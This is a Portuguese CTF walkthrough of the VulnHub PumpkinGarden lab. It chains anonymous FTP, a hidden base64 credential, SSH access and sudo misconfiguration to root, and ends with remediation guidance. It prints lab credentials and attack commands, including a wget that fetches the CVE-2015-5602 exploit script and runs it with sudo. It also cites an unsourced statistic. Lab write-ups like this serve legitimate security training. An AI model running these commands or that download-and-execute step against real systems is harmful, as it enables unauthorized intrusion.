# VulnHub Mission-Pumpkin v1.0: PumpkinGarden — Truque ou Root?

Vejam só pessoal! Um desafio que foge um pouco da regra tradicional, e olha, a temática de Halloween foi bem executada aqui. O LordPumpkin está guardando as chaves do jardim, e nós vamos tirar ele do caminho. ( ͡° ͜ʖ ͡°)

PumpkinGarden é o nível 1 de 3 da série Mission-Pumpkin v1.0, criada pelo autor Jayanth. É classificado como nível básico, mas não deixe isso te enganar: a habilidade real que ele testa é observação e a capacidade de encadear pistas pequenas em um caminho de ataque limpo. FTP anônimo vaza um nome de usuário, uma página web esconde credenciais em base64 dentro de um diretório oculto, e uma configuração errônea de sudo dá dois caminhos distintos para escalar privilégios.

Para download e informações técnicas: https://www.vulnhub.com/entry/mission-pumpkin-v10-pumpkingarden,321/

Este artigo é o primeiro de uma série de três artigos ao todo.

---

| Campo | Valor |
|-------|-------|
| **Nível** | Beginner |
| **VM Alvo** | Mission-Pumpkin v1.0: PumpkinGarden |
| **VM Atacante** | Kali Linux 2019.1 |
| **VulnHub** | https://www.vulnhub.com/entry/mission-pumpkin-v10-pumpkingarden,321/ |
| **Técnicas** | FTP anônimo, enumeração web, diretório oculto, decode base64, SSH, escalação de privilégios via sudo (dois métodos) |
| **CVEs** | CVE-2015-5602 (sudo arbitrary file read, exploit DB 38362) |

> **Objetivo da VM (do autor):**
> "PumpkinGarden is Level 1 of series of 3 machines under Mission-Pumpkin v1.0. The end goal of this CTF is to gain access to PumpkinGarden_key file stored in the root account."

---

## Resumo do Ataque

```
[IP exibido no banner do console da VM]
    |
    v
[nmap: FTP(21), HTTP(1515), SSH(3535)]
    |
    v
[login FTP anônimo -> note.txt -> usuário: jack]
    |
    v
[HTTP porta 1515 -> código-fonte com comentário -> diretório /img]
    |
    v
[dirb no /img -> /img/hidden_secret/ -> clue.txt (base64)]
    |
    v
[base64 decode clue.txt -> scarecrow:5Qn@$y]
    |
    v
[SSH login scarecrow@alvo:3535]
    |
    v
[~/note.txt -> usuário goblin + senha Y0n$M4sy3D1t]
    |
    v
[su goblin -> sudo -l -> ALL exceto /bin/su]
    |
    v
[sudo /bin/bash -> root OU Método 2: exploit CVE-2015-5602]
    |
    v
[cat /root/PumpkinGarden_Key -> base64 -> Congratulations!]
```

---

## Metodologia

1. Identificação do IP: fornecido no banner do console da VM
2. Varredura completa com Nmap para enumerar todos os serviços
3. Enumeração de FTP anônimo e recuperação de arquivo
4. Análise da aplicação HTTP na porta 1515
5. Brute-force de diretórios para encontrar `/img/hidden_secret`
6. Decode base64 do `clue.txt` para obter credenciais SSH
7. Login SSH, movimento lateral através de notas de usuários
8. Escalação de privilégios via misconfiguration de sudo (dois métodos)
9. Leitura e decode da flag

---

## Etapa 1: Identificando o Alvo

Esta máquina é simpática: o endereço IP é exibido no banner do console no momento em que a VM inicializa. Não é necessário rodar arp-scan ou netdiscover.

```bash
# A VM exibe o próprio IP no boot:
# "This machine is up and running at 192.168.10.190"

# Opcional: confirmar pelo lado do atacante
arp-scan --ignoredups --localnet
# ou: nmap -sn -T5 192.168.10.0/24
```

> **MITRE ATT&CK:** [TA0043 Reconnaissance] [T1595.001 Active Scanning: Scanning IP Blocks]

---

## Etapa 2: Reconhecimento e Enumeração de Vulnerabilidades

Utilizando o Nmap, vamos realizar uma análise do alvo, a fim de enumerar as portas e serviços. Varrer todas as 65535 portas é fundamental aqui: o HTTP está na 1515 e o SSH na 3535, não nas padrões.

```bash
nmap -A -T4 -p- 192.168.10.190
# -A: detecção de OS, versões, scripts, traceroute
# -T4: timing agressivo (seguro em lab local)
# -p-: todas as 65535 portas (crítico: esta VM usa portas não-padrão)
```

Saída esperada:

```
21/tcp   open  ftp     vsftpd 2.0.8 or later
1515/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
3535/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13
```

Três serviços: FTP (21), HTTP (1515), SSH (3535). As informações trazidas pelo Nmap sobre o FTP já foram bastante úteis, pois sabemos que é possível acessar este serviço utilizando um usuário "anônimo" e há um arquivo de texto no diretório com permissão de leitura para qualquer um.

> **MITRE ATT&CK:** [T1046 Network Service Discovery] [T1595.002 Active Scanning: Vulnerability Scanning]

---

## Etapa 3: Enumeração do FTP Anônimo

> **O que é FTP anônimo?**
> Muitos servidores FTP estão configurados para permitir login com o usuário `anonymous` e qualquer string como senha. Foi intencional em implantações mais antigas para compartilhamento público de arquivos, mas frequentemente aparece mal configurado em servidores internos, expondo arquivos sensíveis para qualquer usuário não autenticado na rede.
> CWE-284: Improper Access Control.

```bash
ftp 192.168.10.190
# Name: anonymous
# Password: anonymous  (qualquer string funciona, até em branco)

ftp> ls
ftp> get note.txt
ftp> quit
```

Ler o arquivo:

```bash
cat note.txt
```

Saída esperada:

```
Hello Dear!
Looking for route map to PumpkinGarden? I think jack can help you find it.
```

Ótima pista: o usuário `jack` é mencionado. Isso indica que jack é uma conta real no sistema.

> **Nota do mundo real:** FTP anônimo ainda é encontrado com frequência em testes de intrusão internos em empresas brasileiras, especialmente em servidores de arquivos legados. Um auditor que encontra um servidor de impressora ou um sistema de backup com FTP anônimo ativo pode ter acesso a diagramas de rede, planilhas de senhas e credenciais de banco de dados em texto puro. Pô, parece exagero, mas acontece mais do que se imagina.

> **MITRE ATT&CK:** [T1133 External Remote Services] [T1083 File and Directory Discovery]

---

## Etapa 4: Analisando a Aplicação Web (Porta 1515)

Acessar o serviço web via browser ou curl. A página principal é simples, mas contém uma dica no código-fonte.

```bash
# Via curl
curl -s http://192.168.10.190:1515/

# Ou abrir no browser: http://192.168.10.190:1515/
```

O texto da página traz:

```
But, I found the route map to PumpkinGarden somewhere under the hood.
```

Embora nada muito útil, esta última frase apresentada dá uma ideia de que há algo escondido na página. ¯\_(ツ)_/¯

Analisando o código-fonte, encontramos uma linha com um comentário específico (linha 16):

```html
<!-- searching for the route map? Pumpkin images may help you find the way -->
```

Em resumo: pode ser que encontre algo dentro da pasta "images". A linha 19 aponta para `/img`. Para não ficar na tentativa manual, execute o Dirb:

```bash
dirb http://192.168.10.190:1515/ -w
# Alternativa: gobuster dir -u http://192.168.10.190:1515/ -w /usr/share/wordlists/dirb/common.txt
```

Saída esperada:

```
==> DIRECTORY: http://192.168.10.190:1515/img/
```

Dentro desta pasta, há outro diretório: `/img/hidden_secret/`. O conteúdo lista apenas um arquivo: `clue.txt`.

```bash
curl -s http://192.168.10.190:1515/img/hidden_secret/clue.txt
```

Saída esperada:

```
c2NhcmVjcm93IDogNVFuQCR5
```

Se você possui alguma prática em CTF, já deve presumir que se trata de base64 ou base32. Para confirmar, basta testar a decodificação no terminal:

```bash
echo "c2NhcmVjcm93IDogNVFuQCR5" | base64 -d
```

Saída esperada:

```
scarecrow : 5Qn@$y
```

Wow guys! Temos uma informação de usuário e senha aqui. (☞ﾟヮﾟ)☞

> **Nota do mundo real:** Credenciais escondidas em base64 dentro de caminhos acessíveis pela web é um achado surpreendentemente comum em assessments de aplicações web reais. Desenvolvedores às vezes usam base64 para "ofuscar" credenciais em arquivos de configuração ou comentários HTML, achando que isso provê alguma segurança. Não provê absolutamente nada.

> **MITRE ATT&CK:** [T1552.001 Unsecured Credentials: Credentials in Files] [T1083 File and Directory Discovery]

---

## Etapa 5: Explorando o Alvo via SSH

Agora que temos credenciais, podemos acessar via SSH na porta 3535.

```bash
ssh scarecrow@192.168.10.190 -p 3535
# Senha: 5Qn@$y
```

Ao listar o conteúdo da pasta atual, você irá notar um arquivo chamado `note.txt`:

```bash
ls -la
cat note.txt
```

Saída esperada:

```
Oops!!! I just forgot; keys to the garden are with LordPumpkin(ROOT user)!
Reach out to goblin and share this "Y0n$M4sy3D1t" to secretly get keys from LordPumpkin.
```

Ao que tudo indica, esta dica traz mais um usuário (`goblin`) e uma possível senha (`Y0n$M4sy3D1t`).

Você pode confirmar esta informação de usuários tentando ler o conteúdo do `/etc/passwd`:

```bash
cat /etc/passwd
```

Observe que realmente há o usuário `goblin`, além de outros (`jack`, `scarecrow`, `goblin`, `ftp`). Todos os personagens do livro estão aqui. ( ͡° ͜ʖ ͡°)

Verifique também as permissões SUDO do usuário atual:

```bash
sudo -l
```

O usuário `scarecrow` não tem permissão para executar o SUDO. Também não foi possível listar o conteúdo dos diretórios dos outros usuários.

> **MITRE ATT&CK:** [T1021.004 Remote Services: SSH] [T1078 Valid Accounts]

---

## Etapa 6: Movimento Lateral para o Usuário Goblin

Trocar para o usuário `goblin` com as credenciais já obtidas:

```bash
su goblin
# Senha: Y0n$M4sy3D1t
```

Acessar o diretório home do usuário goblin e ler o arquivo `note`:

```bash
cd ~
cat note
```

O conteúdo traz um link para download de um exploit:

```
https://www.securityfocus.com/data/vulnerabilities/exploits/38362.sh
```

Além disso, verificar os privilégios SUDO:

```bash
sudo -l
```

Saída esperada:

```
User goblin may run the following commands on this host:
    (ALL) ALL
    (root) NOPASSWD: ALL
    !/bin/su
```

Traduzindo: goblin pode executar qualquer coisa como root, exceto `/bin/su`. O que isso nos diz? ¯\_(ツ)_/¯

Dois caminhos de exploração surgem. Vamos ver os dois.

> **MITRE ATT&CK:** [T1078 Valid Accounts] [TA0008 Lateral Movement] [T1087 Account Discovery]

---

## Etapa 7A: Escalando Privilégios (Método 1) — CVE-2015-5602

> **O que é o CVE-2015-5602?**
> Uma vulnerabilidade em versões do sudo anteriores a 1.8.15 onde o `sudoedit` não valida corretamente o editor e os argumentos, permitindo que um usuário com acesso sudo restrito leia ou escreva arquivos arbitrários. O exploit referenciado (38362.sh no SecurityFocus) cria um wrapper de sudoedit para escalar privilégios.

O exploit script se apaga alguns segundos depois do download (há um cron job limpando o diretório a cada 15 segundos). Para verificar:

```bash
ps aux | grep -E "cron|rm|sh"
```

Você perceberá que há uma execução a cada 15 segundos que exclui todos os arquivos com extensão `*.*` do diretório do usuário `goblin` e qualquer arquivo do `/tmp`.

A solução é simples: baixar o arquivo sem extensão usando o parâmetro `-O` do wget.

```bash
# Encontrar diretórios com permissão de escrita
find / -writable -type d 2>/dev/null

# Baixar sem extensão para sobreviver à limpeza automática
cd /home/goblin
wget https://www.securityfocus.com/data/vulnerabilities/exploits/38362.sh -O exploit
```

Ajustar o exploit para usar `/home/goblin` em vez de `/tmp`:

```bash
sed -i 's/\/tmp/\/home\/goblin/g' exploit
chmod +x exploit
sudo ./exploit /home/goblin/note
```

Ou extrair manualmente as linhas relevantes do script:

```bash
sed -n '17,21p' exploit > xpl
chmod a+x xpl
sudo ./xpl
```

E bingo!! huahuahua

Agora temos permissão de root! ;)

---

## Etapa 7B: Escalando Privilégios (Método 2) — Sudo Direto (Mais Simples!)

Véi, se você leu o `sudo -l` com atenção, percebeu que goblin pode executar `ALL` exceto `/bin/su`. Isso significa que `sudo /bin/bash` é completamente permitido. A exclusão `!/bin/su` bloqueia apenas aquele binário específico.

```bash
sudo /bin/bash
# ou
sudo -u root /bin/bash
```

Saída esperada:

```
root@pumpkin:~#
```

É isso. O exploit do método 1 foi interessante academicamente, mas este aqui são literalmente duas palavras. E sim, isso significa que toda a tentativa de baixar e rodar o exploit foi basicamente perda de tempo. huahuahuahua ¯\_(ツ)_/¯

Maravilha!! Agora estamos logados como usuário root! ;)

**(☞ﾟヮﾟ)☞ Got root!! :D**

> **Nota do mundo real:** Configurações de sudo excessivamente permissivas com exclusões pontuais são uma das misconfigurações mais comuns encontradas em servidores Linux corporativos. Um admin que quer "negar acesso de shell root" bloqueia `/bin/su` mas esquece de `/bin/bash`, `/bin/sh`, `/usr/bin/python`, e dezenas de outros binários que abrem shell. GTFOBins documenta mais de 200 binários abusáveis via sudo. Referência: https://gtfobins.github.io/

> **MITRE ATT&CK:** [TA0004 Privilege Escalation] [T1548.003 Abuse Elevation Control Mechanism: Sudo]

> **GTFOBins reference:** https://gtfobins.github.io/gtfobins/bash/#sudo

---

## Etapa 8: Root e Flag

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)

cd /root
cat PumpkinGarden_Key
```

Saída esperada:

```
Q29uZ3JhdHVsYXRpb25zIQ==
```

Parece estar cifrado em base64. Claro que sim. ¯\_(ツ)_/¯ Basta tentar decifrá-lo:

```bash
echo "Q29uZ3JhdHVsYXRpb25zIQ==" | base64 -d
```

```
Congratulations!
```

GG!! O LordPumpkin foi derrotado. ᕕ( ᐛ )ᕗ

---

## Artefatos Capturados: Flags, Hashes e Credenciais

| Tipo | Valor | Onde Foi Encontrado | Crackado/Usado |
|------|-------|---------------------|----------------|
| Nota | Usuário: `jack` | FTP anônimo `/note.txt` | Enumeração apenas |
| Credencial | `scarecrow:5Qn@$y` | `/img/hidden_secret/clue.txt` (base64) | Login SSH |
| Credencial | `goblin:Y0n$M4sy3D1t` | `~/note.txt` (home do scarecrow, SSH) | su goblin |
| Flag (base64) | `Q29uZ3JhdHVsYXRpb25zIQ==` | `/root/PumpkinGarden_Key` | N/A |
| Flag (decodificada) | `Congratulations!` | Decodificada do acima | N/A |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|--------|--------------------------|-----------------|
| 1 | FTP anônimo habilitado com arquivos legíveis | Servidores FTP legados em LANs corporativas frequentemente permitem acesso anônimo; auditores encontram diagramas de rede, planilhas de senhas e credenciais nestas shares | Desabilitar FTP anônimo; usar SFTP ou FTPS com autenticação somente |
| 2 | Credenciais armazenadas em base64 em caminho web-acessível | Desenvolvedores "ofuscam" credenciais em comentários HTML ou diretórios públicos achando que base64 provê segurança; não provê | Nunca armazenar credenciais em caminhos web-acessíveis; usar gerenciadores de segredos |
| 3 | Configuração sudo com política de exclusão única | Regras sudo excessivamente permissivas (`ALL` exceto um binário) são comuns em Linux corporativo; uma única omissão deixa dezenas de caminhos de escalação abertos | Seguir menor privilégio: listar explicitamente apenas o que o usuário precisa via sudo |
| 4 | Credenciais transmitidas em arquivos de nota em texto puro | Pivotamento interno frequentemente expõe credenciais em notas, scripts e arquivos de config deixados por desenvolvedores | Implementar varredura de segredos em pipelines CI/CD; auditar diretórios home |
| 5 | Portas não-padrão dando falsa sensação de segurança | Mover SSH para a porta 3535 não impede a descoberta; filtra apenas scanners automatizados com listas de portas padrão | Segurança por obscuridade falha sob teste direcionado; usar segmentação de rede e regras de firewall corretas |

**Por que isso importa fora do laboratório?**

A cadeia de credenciais desta máquina (FTP aponta para caminho web, que aponta para SSH, que aponta para nota com nova credencial, que leva ao root) espelha padrões reais documentados em relatórios de DFIR. No Brasil, a LGPD (Lei Geral de Proteção de Dados) responsabiliza explicitamente as organizações por controles de acesso inadequados, e um FTP anônimo vazando notas internas constituiria um incidente reportável sob o Artigo 48. O padrão de sudo `ALL exceto su` é encontrado em aproximadamente 30% dos achados de escalação de privilégios em Linux em relatórios reais de pentest, tipicamente introduzido quando um admin concede acesso elevado às pressas. Capaz que você já encontrou isso em algum engajamento, né.

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | TTP-ID |
|------|--------|---------|--------|
| Reconhecimento | TA0043 | Active Scanning: Vulnerability Scanning | T1595.002 |
| Reconhecimento | TA0043 | Network Service Discovery | T1046 |
| Acesso Inicial | TA0001 | External Remote Services (FTP anônimo) | T1133 |
| Acesso Inicial | TA0001 | Valid Accounts (scarecrow do clue.txt) | T1078 |
| Acesso a Credenciais | TA0006 | Unsecured Credentials: Credentials in Files | T1552.001 |
| Descoberta | TA0007 | File and Directory Discovery (dirb no /img) | T1083 |
| Descoberta | TA0007 | Account Discovery | T1087 |
| Movimento Lateral | TA0008 | Remote Services: SSH (scarecrow) | T1021.004 |
| Movimento Lateral | TA0008 | Valid Accounts (su para goblin) | T1078 |
| Escalação de Privilégios | TA0004 | Sudo and Sudo Caching | T1548.003 |
| Escalação de Privilégios | TA0004 | Exploitation for Privilege Escalation (CVE-2015-5602) | T1068 |
| Coleta | TA0009 | Data from Local System (PumpkinGarden_Key) | T1005 |

> Referência: https://attack.mitre.org/

---

## Remediação e Contenção

### Correções Técnicas

1. Desabilitar FTP anônimo: definir `anonymous_enable=NO` no vsftpd.conf e reiniciar o serviço.
2. Remover credenciais de diretórios web-acessíveis; usar um gerenciador de segredos para valores sensíveis que precisam persistir.
3. Corrigir a política sudo do goblin: se acesso elevado é legitimamente necessário, restringir a binários específicos obrigatórios, nunca usar `ALL` como concessão.
4. Enforçar senhas fortes em todas as contas de usuário; `5Qn@$y` é curta e pode ser crackeada com regras de mutação direcionadas.
5. Mover SSH de volta para a porta 22 ou uma porta padrão documentada; confiar em fail2ban, AllowUsers e autenticação por chave em vez de ofuscação de porta.
6. Aplicar patches no sudo para versão atual (CVE-2015-5602 afeta versões anteriores à 1.8.15).

### Se Você Encontrar Algo Parecido no Seu Ambiente

**Contenção imediata:**
- Desabilitar FTP anônimo imediatamente se encontrado em produção.
- Rotacionar todas as credenciais encontradas em arquivos em texto puro ou artefatos codificados em base64.
- Revisar o sudoers com `visudo` e revogar qualquer concessão `ALL` não explicitamente necessária.
- Verificar `/etc/passwd` por contas de usuário inesperadas e auditar seus privilégios sudo.

**Contramedidas MITRE D3FEND:**
- D3-MFA (Multi-factor Authentication) para acesso SSH (T1021.004)
- D3-IVA (Input Validation / Access Control Enforcement) para FTP anônimo (T1133)
- D3-CTS (Credential Transmission Scoping) para credenciais base64 em caminhos web (T1552.001)
- D3-SJA (Scheduled Job Analysis) para a limpeza via cron (T1053.003)

### Alinhamento de Frameworks

**NIST CSF 2.0:**
- Identify (ID.AM): Inventariar todos os serviços incluindo FTP; sinalizar serviços com login anônimo habilitado.
- Protect (PR.AC-1): Enforçar menor privilégio em todas as contas; remover concessões sudo excessivamente permissivas.
- Detect (DE.CM-7): Monitorar logs de acesso FTP para eventos de login anônimo.
- Respond (RS.AN-1): Investigar e conter dentro do SLA definido ao detectar exposição de credenciais.
- Recover (RC.IM-1): Atualizar configurações e aplicar patches no sudo após contenção.

**NIST SP 800-53 (Rev. 5):**
- AC-6: Menor Privilégio (misconfiguration sudo)
- IA-5: Gestão de Autenticadores (credenciais em texto puro/base64 em arquivos)
- CM-7: Funcionalidade Mínima (desabilitar FTP anônimo, serviços desnecessários)
- SI-2: Remediação de Falhas (patch CVE-2015-5602)
- AU-2: Registro de Eventos (eventos de login FTP e SSH)

**CISA Known Exploited Vulnerabilities:**
- CVE-2021-3156 (Baron Samedit, sudo Heap Buffer Overflow): mesma família do sudo. Listado no catálogo CISA KEV.
- Referência: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

**C2M2:**
- Domínio: ACCESS (Identity and Access Management)
- Prática: Gerenciar credenciais e acessos de usuários para limitar o raio de explosão
- Target MIL: MIL-2 (práticas documentadas, aplicadas consistentemente)

---

## Considerações Finais

Percebemos com este desafio que, embora os conhecimentos básicos de um processo de Pentest sejam bem importantes, além é claro de conhecer as principais ferramentas para exploração, é preciso pensar e observar bastante os detalhes.

É preciso pensar fora da caixa!

Este é um desafio de nível básico, mas dependendo dos seus conhecimentos, poderá deixar você preso por horas tentando executar o exploit quando a solução mais simples estava bem na frente. huahuahua.

Obrigado ao autor Jayanth por construir uma máquina que demonstra perfeitamente como uma cadeia de pequenas misconfigurações, cada uma parecendo inofensiva isoladamente, resulta em comprometimento total do sistema.

De qualquer forma, espero que a leitura deste tutorial lhe traga algum novo conhecimento ou reforce aqueles que você já possui. Não deixe de comentar e compartilhar entre os amigos!

*Thanks guys!! (❍ᴥ❍ʋ)*

> Artigo original em português de André Henrique: https://medium.com/@mrhenrike

---

*Writeup por [André Henrique](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
